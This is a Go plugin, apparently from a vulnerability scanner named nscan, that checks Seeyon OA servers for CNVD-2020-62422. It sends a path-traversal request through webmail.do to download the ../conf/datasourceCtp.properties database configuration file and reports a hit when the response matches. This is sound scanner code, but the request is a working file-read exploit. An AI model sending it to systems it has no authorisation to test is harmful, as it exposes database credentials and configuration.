@@ -1,0 +1,20 @@
+package seeyon
+
+import (
+	"fmt"
+	"nscan/plugins/log"
+	"nscan/utils"
+	"strings"
+)
+
+//webmail.do任意文件下载
+
+func CNVD_2020_62422(u string) bool {
+	if req, err := utils.HttpRequset(u+"/seeyon/webmail.do?method=doDownloadAtt&filename=PeiQi.txt&filePath=../conf/datasourceCtp.properties", "GET", "", false, nil); err == nil {
+		if req.StatusCode == 200 && strings.Contains(req.Body, "workflow") {
+			log.Logger.Warn().Msg(fmt.Sprintf("Found vuln seeyon CNVD_2020_62422|%s\n", u+"/seeyon/webmail.do?method=doDownloadAtt&filename=PeiQi.txt&filePath=../conf/datasourceCtp.properties"))
+			return true
+		}
+	}
+	return false
+}
